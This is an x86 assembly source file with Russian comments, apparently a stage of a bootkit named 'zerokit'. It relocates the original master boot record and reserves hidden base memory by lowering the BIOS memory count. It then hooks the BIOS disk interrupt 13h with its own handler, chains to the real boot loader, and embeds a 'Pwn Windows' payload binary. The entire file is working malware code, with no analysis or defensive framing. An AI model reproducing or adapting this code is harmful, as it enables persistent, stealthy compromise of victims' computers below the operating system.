org 200h                                                    ; В первых 512 байтах находится оригинальный MBR.

jmp l_bk_start
; Копия заголовка zerokit_header_t
zhdr_pack_size dd 0
zhdr_bk_size dd 0
zhdr_bk_payload32_size dd 0
zhdr_bk_payload64_size dd 0
zhdr_conf_size dd 0
zhdr_bundle_size dd 0

l_bk_start:
push cs
pop ds                                                     ; В ds ложим наш новый сегмент ~ 3000h.
xor eax, eax
mov es, ax                                                 ; Обнуляем es и остальные регистры.

; Values Bootstrap loader is called with (IBM BIOS):
;       CS:IP = 0000h:7C00h
;       DH = access
;           bits 7-6,4-0: don't care
;           bit 5: =0 device supported by INT 13
;       DL = boot drive
;           00h first floppy
;           80h first hard disk

; 1. Копируем оригинальный бутсектор по адресу 0000h:7C00h.
; 2. Выделяем себе место в базовой памяти и туда копируем себя.
; 3. Устанавливаем свой обработчик прерывания 13h.
; 4. Передаём управление на оригинальный MBR

xor si, si
mov di, 0x7C00
mov ecx, 128
rep movsd

mov si, 0x413                                                                   ; Размер базовой памяти в килобайтах (BIOS Data Area (0040h:0013h))
                                                                                ; По адресу 0x413 находится слово, в котором содержится количество свободной памяти в пределах первых 640 Кб.
sub [es:si], word 8                                                             ; Резервируем для себя 8Кб.
es lodsw                                                                        ; 
shl ax, 6                                                                       ; * 1024 / 16
mov es, ax                                                                      ; Сегмент целевого места.
xor di, di                                                                      ; Смещение целевого места.
mov si, 0x0E00                                                                  ; Смещение исходного места (смещение где находится windows.asm).
mov ecx, l_zbk_body_end - l_zbk_body_begin                                      ; Размер копируемых данных в байтах.
rep movsb                                                                       ; Копируем наш код в выделенное место.

push word 0
pop ds

mov eax, [0x13 * 4]                                                             ; Сохраняем оригинальный обработчик прерывания.
mov [es:1], eax                                                                 ; сохраняем его в качестве операнда инструкции jmp.
mov [0x13 * 4], word 6                                                          ; Устанавливаем свой обработчик (смещение до hook_proc_int_13h в windows.asm).
mov [0x13 * 4 + 2], es

popad                                                                           ; Восстанавливаем ранее сохранённые регистры.
jmp 0x0000:0x7C00                                                               ; Передаём управление оригинальному загрузчику.

times 3072 - ($ - $$) db 0

; include Pwn Windows
l_zbk_body_begin:
file "..\bin\windows.bin"
l_zbk_body_end: